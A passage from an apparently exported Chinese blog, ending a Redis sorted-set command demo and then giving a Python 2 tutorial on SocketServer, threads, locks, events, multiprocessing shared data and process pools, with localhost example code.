class="line">192.168.0.201:6379&gt; ZSCORE youxu 80 a</span><br><span class="line">(nil)</span><br><span class="line">192.168.0.201:6379&gt; ZADD youxu 81 b</span><br><span class="line">(integer) 1</span><br><span class="line"><span class="meta">#</span><span class="bash">可以添加多个</span></span><br><span class="line">192.168.0.201:6379&gt; ZADD youxu 82 c 83 d</span><br><span class="line">(integer) 2</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">获取分数</span></span><br><span class="line">192.168.0.201:6379&gt; ZSCORE youxu a</span><br><span class="line">"80"</span><br><span class="line">192.168.0.201:6379&gt; ZSCORE youxu b</span><br><span class="line">"81"</span><br><span class="line">192.168.0.201:6379&gt; ZSCORE youxu c</span><br><span class="line">"82"</span><br><span class="line">192.168.0.201:6379&gt; ZSCORE youxu d</span><br><span class="line">"83"</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">获取有序集合范围</span></span><br><span class="line">192.168.0.201:6379&gt; ZRANGE youxu 0 3   #参考列表集合的0 3  从0到3的元素</span><br><span class="line">1) "a"</span><br><span class="line">2) "b"</span><br><span class="line">3) "c"</span><br><span class="line">4) "d"</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">在举个例子：</span></span><br><span class="line">192.168.0.201:6379&gt; ZADD youxu 79 e</span><br><span class="line">(integer) 1</span><br><span class="line"> </span><br><span class="line">192.168.0.201:6379&gt; ZRANGE youxu 0 4</span><br><span class="line">1) "e"</span><br><span class="line">2) "a"</span><br><span class="line">3) "b"</span><br><span class="line">4) "c"</span><br><span class="line">5) "d</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
        <category>NoSQL</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Python之进程线程协程</title>
    <url>/articles/fa6bf072.html</url>
    <content><![CDATA[<h2 id="Socket-Server模块"><a href="#Socket-Server模块" class="headerlink" title="Socket Server模块"></a>Socket Server模块</h2><p>SocketServer内部使用 IO多路复用 以及 “多线程” 和 “多进程” ，从而实现并发处理多个客户端请求的Socket服务端。即：每个客户端请求连接到服务器时，Socket服务端都会在服务器是创建一个“线程”或者“进程” 专门负责处理当前客户端的所有请求。</p>
<p>socket server和select &amp; epoll 还是不太一样他的本质是：客户端第一次链接的时候，只要一进来，我服务端有个while循环为你创建一个<br>线程和进程，客户端就和服务端直接创建通信，以后传送数据什么的就不会通过server端了，直接他俩通过线程或者进程通信就可以了！</p>
<p>如果在多进程的时候，client1和client2他们同时传输10G的文件都是互相不影响！<br>如果在多线程的时候，python中的多线程，在同一时间只有一个线程在工作，他底层会自动进行上下文切换，client1传一点，client2传一点。</p>
<p>知识回顾：<br>python中的多线程，有一个GIL在同一时间只有一个线程在工作，他底层会自动进行上下文切换.<br>这样会导致python的多线程效率会很低，也就是人们经常说的python多线程问题</p>
<p>如下图：</p>
<p>第一次连接后，数据通讯就通过线程或进程进行数据交换（红色箭头）</p>
<p><img src="/articles/fa6bf072/1.png" alt></p>
<h2 id="ThreadingTCPServer"><a href="#ThreadingTCPServer" class="headerlink" title="ThreadingTCPServer"></a><strong>ThreadingTCPServer</strong></h2><p>ThreadingTCPServer实现的Socket服务器内部会为每个client创建一个 “<strong>线程</strong>”，该线程用来和客户端进行交互。</p>
<h4 id="ThreadingTCPServer基础"><a href="#ThreadingTCPServer基础" class="headerlink" title="ThreadingTCPServer基础"></a>ThreadingTCPServer基础</h4><p>使用ThreadingTCPServer:</p>
<ul>
<li>创建一个继承自 SocketServer.BaseRequestHandler 的类</li>
<li>类中必须定义一个名称为 handle 的方法</li>
<li>启动ThreadingTCPServer</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyServer</span><span class="params">(SocketServer.BaseRequestHandler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span> <span class="comment">#定义handle方法</span></span><br><span class="line">        <span class="comment"># print self.request,self.client_address,self.server</span></span><br><span class="line">        conn = self.request <span class="comment">#如果连接请求过来，获取client端对象</span></span><br><span class="line">        conn.sendall(<span class="string">'欢迎致电 10086，请输入1xxx,0转人工服务.'</span>) <span class="comment">#发送一个信息</span></span><br><span class="line">        Flag = <span class="literal">True</span> <span class="comment">#并把Flag设置为True</span></span><br><span class="line">        <span class="keyword">while</span> Flag:当Flag为<span class="literal">True</span>的时候执行</span><br><span class="line">            data = conn.recv(<span class="number">1024</span>) <span class="comment">#接收client端数据</span></span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">'exit'</span>: <span class="comment">#判断如果data  == 'exit' 退出</span></span><br><span class="line">                Flag = <span class="literal">False</span> <span class="comment">#并把Flag设置为Flase</span></span><br><span class="line">            <span class="keyword">elif</span> data == <span class="string">'0'</span>: <span class="comment">#如果为 == ‘0’ </span></span><br><span class="line">                conn.sendall(<span class="string">'通过可能会被录音.balabala一大推'</span>) <span class="comment">#发送数据</span></span><br><span class="line">            <span class="keyword">else</span>:<span class="comment">#上面的都没匹配上，发送请重新输入</span></span><br><span class="line">                conn.sendall(<span class="string">'请重新输入.'</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server = SocketServer.ThreadingTCPServer((<span class="string">'127.0.0.1'</span>,<span class="number">8009</span>),MyServer) <span class="comment">#实例化对象，设置启动的IP/PORT并把自己定义的类写上作为SocketServer.ThreadingTCPServer的构造函数</span></span><br><span class="line">    server.serve_forever() <span class="comment">#调用对象中的启动方法</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip_port = (<span class="string">'127.0.0.1'</span>,<span class="number">8009</span>)</span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.connect(ip_port)</span><br><span class="line">sk.settimeout(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = sk.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'receive:'</span>,data</span><br><span class="line">    inp = raw_input(<span class="string">'please input:'</span>)</span><br><span class="line">    sk.sendall(inp)</span><br><span class="line">    <span class="keyword">if</span> inp == <span class="string">'exit'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">sk.close()</span><br></pre></td></tr></table></figure>

<h4 id="ThreadingTCPServer源码剖析"><a href="#ThreadingTCPServer源码剖析" class="headerlink" title="ThreadingTCPServer源码剖析"></a>ThreadingTCPServer源码剖析</h4><p> <img src="/articles/fa6bf072/2.png" alt></p>
<p>学会看源码非常重要！不能仅仅光会用！大赞~ 知道他的过程和实现~ 怎么学会看源码呢？多看然后画类图，如上图！！！</p>
<p>在理解的时候可以把他们想象为，把所有需要用的方法，都抓到ThreadingTCPServer中</p>
<p>内部调用流程为：</p>
<ul>
<li>启动服务端程序</li>
<li>执行 TCPServer.<strong>init</strong> 方法，创建服务端Socket对象并绑定 IP 和 端口</li>
<li>执行 BaseServer.<strong>init</strong> 方法，将自定义的继承自SocketServer.BaseRequestHandler 的类 MyRequestHandle赋值给 self.RequestHandlerClass</li>
<li>执行 BaseServer.server_forever 方法，While 循环一直监听是否有客户端请求到达 …</li>
<li>当客户端连接到达服务器</li>
<li>执行 ThreadingMixIn.process_request 方法，创建一个 “线程” 用来处理请求</li>
<li>执行 ThreadingMixIn.process_request_thread 方法</li>
<li>执行 BaseServer.finish_request 方法，执行 self.RequestHandlerClass()  即：执行 自定义 MyRequestHandler 的构造方法（自动调用基类BaseRequestHandler的构造方法，在该构造方法中又会调用 MyRequestHandler的handle方法）</li>
</ul>
<p>精简源码：</p>
<p>模拟Socekt Server的简化版本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(request, client_address)</span>:</span> <span class="comment">#模拟定义的handle()方法，这个方法内的代码是socket server与Client端交互代码</span></span><br><span class="line">    <span class="keyword">print</span> request,client_address</span><br><span class="line">    conn = request</span><br><span class="line">    conn.sendall(<span class="string">'欢迎致电 10086，请输入1xxx,0转人工服务.'</span>)</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">while</span> flag:</span><br><span class="line">        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">'exit'</span>:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> data == <span class="string">'0'</span>:</span><br><span class="line">            conn.sendall(<span class="string">'通过可能会被录音.balabala一大推'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            conn.sendall(<span class="string">'请重新输入.'</span>)</span><br><span class="line"></span><br><span class="line">sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sk.bind((<span class="string">'127.0.0.1'</span>,<span class="number">8002</span>))</span><br><span class="line">sk.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  <span class="comment">#这里一个while循环循环监控sk文件句柄</span></span><br><span class="line">    r, w, e = select.select([sk,],[],[],<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'looping'</span></span><br><span class="line">    <span class="keyword">if</span> sk <span class="keyword">in</span> r: <span class="comment">#当sk文件句柄发生变化的时候说明是新的客户端连接过来了</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'get request'</span></span><br><span class="line">        request, client_address = sk.accept()</span><br><span class="line">        t = threading.Thread(target=process, args=(request, client_address)) <span class="comment">#创建一个线程，并调用自己定义的process方法执行~然后样客户端与之交互</span></span><br><span class="line">        t.daemon = <span class="literal">False</span></span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">sk.close()</span><br></pre></td></tr></table></figure>

<p>如精简代码可以看出，SocketServer的ThreadingTCPServer之所以可以同时处理请求得益于 <strong>select</strong> 和 <strong>Threading</strong> 两个东西，其实本质上就是在服务器端为每一个客户端创建一个线程，当前线程用来处理对应客户端的请求，所以，可以支持同时n个客户端链接（长连接）。</p>
<p><strong>ForkingTCPServer</strong></p>
<p>ForkingTCPServer和ThreadingTCPServer的使用和执行流程基本一致，只不过在内部分别为请求者建立 “线程”  和 “进程”。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyServer</span><span class="params">(SocketServer.BaseRequestHandler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># print self.request,self.client_address,self.server</span></span><br><span class="line">        conn = self.request</span><br><span class="line">        conn.sendall(<span class="string">'欢迎致电 10086，请输入1xxx,0转人工服务.'</span>)</span><br><span class="line">        Flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">while</span> Flag:</span><br><span class="line">            data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">'exit'</span>:</span><br><span class="line">                Flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> data == <span class="string">'0'</span>:</span><br><span class="line">                conn.sendall(<span class="string">'通过可能会被录音.balabala一大推'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                conn.sendall(<span class="string">'请重新输入.'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server = SocketServer.ForkingTCPServer((<span class="string">'127.0.0.1'</span>,<span class="number">8009</span>),MyServer)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip_port = (<span class="string">'127.0.0.1'</span>,<span class="number">8009</span>)</span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.connect(ip_port)</span><br><span class="line">sk.settimeout(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = sk.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'receive:'</span>,data</span><br><span class="line">    inp = raw_input(<span class="string">'please input:'</span>)</span><br><span class="line">    sk.sendall(inp)</span><br><span class="line">    <span class="keyword">if</span> inp == <span class="string">'exit'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">sk.close()</span><br></pre></td></tr></table></figure>

<p>以上ForkingTCPServer只是将 ThreadingTCPServer 实例中的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">server = SocketServer.ThreadingTCPServer((<span class="string">'127.0.0.1'</span>,<span class="number">8009</span>),MyRequestHandler)</span><br><span class="line">变更为：</span><br><span class="line">server = SocketServer.ForkingTCPServer((<span class="string">'127.0.0.1'</span>,<span class="number">8009</span>),MyRequestHandler)</span><br></pre></td></tr></table></figure>

<h2 id="Python线程"><a href="#Python线程" class="headerlink" title="Python线程"></a>Python线程</h2><p>Threading用于提供线程相关的操作，线程是应用程序中工作的最小单元。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(arg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'thread'</span>+str(arg)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=show, args=(i,))  <span class="comment">#这里实例化对象的时候传的两个参数第一个参数是，线程需要执行的方法，第二个参数方法的参数</span></span><br><span class="line">    t.start()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">print</span> <span class="string">'main thread stop'</span></span><br></pre></td></tr></table></figure>

<p>上述代码创建了10个“前台”线程，然后控制器就交给了CPU，CPU根据指定算法进行调度，分片执行指令。</p>
<p>再次回顾：这里为什么是分片执行？</p>
<p>python中的多线程，有一个GIL（Global Interpreter Lock 全局解释器锁 ）在同一时间只有一个线程在工作，他底层会自动进行上下文切换.这个线程执行点，那个线程执行点！</p>
<p><strong>更多方法：</strong></p>
<ul>
<li>start       线程准备就绪，等待CPU调度</li>
<li>setName     为线程设置名称</li>
<li>getName     获取线程名称</li>
<li>setDaemon   设置为后台线程或前台线程（默认）</li>
<li>​            如果是后台线程，主线程执行过程中，后台线程也在进行，主线程执行完毕后，后台线程不论成功与否，均停止</li>
<li>​            如果是前台线程，主线程执行过程中，前台线程也在进行，主线程执行完毕后，等待前台线程也执行完成后，程序停止</li>
<li>join        逐个执行每个线程，执行完毕后继续往下执行，该方法使得多线程变得无意义</li>
<li>run         线程被cpu调度后执行Thread类对象的run方法</li>
</ul>
<p><strong>线程锁</strong></p>
<p>由于线程之间是进行随机调度，并且每个线程可能只执行n条执行之后，CPU接着执行其他线程。所以，可能出现如下问题：</p>
<p><img src="/articles/fa6bf072/3.png" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">gl_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(arg)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> gl_num</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    gl_num +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> gl_num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=show, args=(i,))</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'main thread stop'</span></span><br></pre></td></tr></table></figure>

<p><strong>设置线程锁</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">   </span><br><span class="line">gl_num = <span class="number">0</span></span><br><span class="line">   </span><br><span class="line">lock = threading.RLock() <span class="comment">#实例化调用线程锁</span></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Func</span><span class="params">()</span>:</span></span><br><span class="line">    lock.acquire() <span class="comment">#获取线程锁</span></span><br><span class="line">    <span class="keyword">global</span> gl_num</span><br><span class="line">    gl_num +=<span class="number">1</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> gl_num</span><br><span class="line">    lock.release() <span class="comment">#释放线程锁，这里注意，在使用线程锁的时候不能把锁，写在代码中，否则会造成阻塞，看起来“像”单线程</span></span><br><span class="line">       </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=Func)</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>

<p><strong>event</strong></p>
<p>他的作用就是：用主线程控制子线程合适执行，他可以让子线程停下来，也可以让线程继续！<br>他实现的机制就是：标志位“Flag”</p>
<p>事件处理的机制：全局定义了一个“Flag”，如果“Flag”值为 False，那么当程序执行 event.wait 方法时就会阻塞，如果“Flag”值为True，那么event.wait 方法时便不再阻塞。</p>
<ul>
<li>clear：将“Flag”设置为False</li>
<li>set：将“Flag”设置为True</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do</span><span class="params">(event)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'start'</span></span><br><span class="line">    event.wait() <span class="comment">#执行对象weit方法，然后他们停下来，等待“Flag”为True</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'execute'</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">event_obj = threading.Event() <span class="comment">#创建事件的对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=do, args=(event_obj,)) <span class="comment">#吧对象传到每个线程里面了~</span></span><br><span class="line">    t.start()</span><br><span class="line"> </span><br><span class="line">event_obj.clear()  <span class="comment">#设置"Flag"为Flase</span></span><br><span class="line"></span><br><span class="line">inp = raw_input(<span class="string">'input:'</span>)</span><br><span class="line"><span class="keyword">if</span> inp == <span class="string">'true'</span>:</span><br><span class="line">    event_obj.set()</span><br><span class="line">    </span><br><span class="line"><span class="comment">#thread enent 就是这个3个方法的使用</span></span><br></pre></td></tr></table></figure>

<h2 id="Python进程"><a href="#Python进程" class="headerlink" title="Python进程"></a>Python进程</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'say hi'</span>,i</span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    p = Process(target=foo,args=(i,))</span><br><span class="line">    p.start()</span><br></pre></td></tr></table></figure>

<p><strong>注意：由于进程之间的数据需要各自持有一份，所以创建进程需要的非常大的开销。并且python不能再Windows下创建进程！</strong></p>
<p>并且在使用多进程的时候，最好是创建多少个进程？：和CPU核数相等</p>
<p>默认的进程之间相互是独立，如果想让进程之间数据共享，就得有个特殊的数据结构，这个数据结构就可以理解为他有穿墙的功能<br>如果你能穿墙的话两边就都可以使用了<br>使用了3种方法</p>
<p><strong>默认的进程无法进行数据共享：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Manager</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">li = []</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(i)</span>:</span></span><br><span class="line">    li.append(i)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'say hi'</span>,li</span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    p = Process(target=foo,args=(i,))</span><br><span class="line">    p.start()</span><br><span class="line">     </span><br><span class="line"><span class="keyword">print</span> <span class="string">'ending'</span>,li</span><br></pre></td></tr></table></figure>

<p><strong>使用特殊的数据类型，来进行穿墙：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">默认的进程之间相互是独立，如果想让进程之间数据共享，就得有个特殊的数据结构，这个数据结构就可以理解为他有穿墙的功能</span><br><span class="line">如果你能穿墙的话两边就都可以使用了</span><br><span class="line">使用了<span class="number">3</span>种方法</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第一种方法：</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过特殊的数据结构：数组（Array）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Array</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建一个只包含数字类型的数组（python中叫列表）</span></span><br><span class="line"><span class="comment">#并且数组是不可变的，在C，或其他语言中，数组是不可变的，之后再python中数组（列表）是可以变得</span></span><br><span class="line"><span class="comment">#当然其他语言中也提供可变的数组</span></span><br><span class="line"><span class="comment">#在C语言中数组和字符串是一样的，如果定义一个列表，如果可以增加，那么我需要在你内存地址后面再开辟一块空间，那我给你预留多少呢？</span></span><br><span class="line"><span class="comment">#在python中的list可能用链表来做的，我记录了你前面和后面是谁。   列表不是连续的，数组是连续的</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">上面不是列表是“数组"数组是不可变的，附加内容是为了更好的理解数组！</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">temp = Array(<span class="string">'i'</span>, [<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>]) <span class="comment">#这里的i是C语言中的数据结构，通过他来定义你要共享的内容的类型！点进去看~</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Foo</span><span class="params">(i)</span>:</span></span><br><span class="line">    temp[i] = <span class="number">100</span>+i</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> temp:</span><br><span class="line">        <span class="keyword">print</span> i,<span class="string">'-----&gt;'</span>,item</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    p = Process(target=Foo,args=(i,))</span><br><span class="line">    p.start()</span><br><span class="line">    </span><br><span class="line">第二种方法：</span><br><span class="line"><span class="comment">#方法二：manage.dict()共享数据</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Manager  <span class="comment">#这个特殊的数据类型Manager</span></span><br><span class="line"> </span><br><span class="line">manage = Manager()</span><br><span class="line">dic = manage.dict() <span class="comment">#这里调用的时候，使用字典，这个字典和咱们python使用方法是一样的！</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Foo</span><span class="params">(i)</span>:</span></span><br><span class="line">    dic[i] = <span class="number">100</span>+i</span><br><span class="line">    <span class="keyword">print</span> dic.values()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    p = Process(target=Foo,args=(i,))</span><br><span class="line">    p.start()</span><br><span class="line">    p.join()</span><br></pre></td></tr></table></figure>

<p><strong>OK那么问题来了，既然进程之间可以进行共享数据，如果多个进程同时修改这个数据是不是就会造成脏数据？是不是就得需要锁！</strong></p>
<p>进程的锁和线程的锁使用方式是非常一样的知识他们是用的类是在不同地方的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Array, RLock</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Foo</span><span class="params">(lock,temp,i)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    将第0个数加100</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    lock.acquire()</span><br><span class="line">    temp[<span class="number">0</span>] = <span class="number">100</span>+i</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> temp:</span><br><span class="line">        <span class="keyword">print</span> i,<span class="string">'-----&gt;'</span>,item</span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line">lock = RLock()</span><br><span class="line">temp = Array(<span class="string">'i'</span>, [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    p = Process(target=Foo,args=(lock,temp,i,))</span><br><span class="line">    p.start()</span><br></pre></td></tr></table></figure>

<p> <strong>进程池</strong></p>
<p>进程池内部维护一个进程序列，当使用时，则去进程池中获取一个进程，如果进程池序列中没有可供使用的进进程，那么程序就会等待，直到进程池中有可用进程为止。</p>
<p>进程池中有两个方法：</p>
<ul>
<li>apply</li>
<li>apply_async</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span>  multiprocessing <span class="keyword">import</span> Process,Pool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Foo</span><span class="params">(i)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">100</span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Bar</span><span class="params">(arg)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> arg</span><br><span class="line">  </span><br><span class="line">pool = Pool(<span class="number">5</span>) <span class="comment">#创建一个进程池</span></span><br><span class="line"><span class="comment">#print pool.apply(Foo,(1,))#去进程池里去申请一个进程去执行Foo方法</span></span><br><span class="line"><span class="comment">#print pool.apply_async(func =Foo, args=(1,)).get()</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    pool.apply_async(func=Foo, args=(i,),callback=Bar)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">print</span> <span class="string">'end'</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()<span class="comment">#进程池中进程执行完毕后再关闭，如果注释，那么程序直接关闭。</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">apply 主动的去执行</span></span><br><span class="line"><span class="string">pool.apply_async(func=Foo, args=(i,),callback=Bar) 相当于异步，当申请一个线程之后，执行FOO方法就不管了，执行完之后就在执行callback ，当你执行完之后，在执行一个方法告诉我执行完了</span></span><br><span class="line"><span class="string">callback 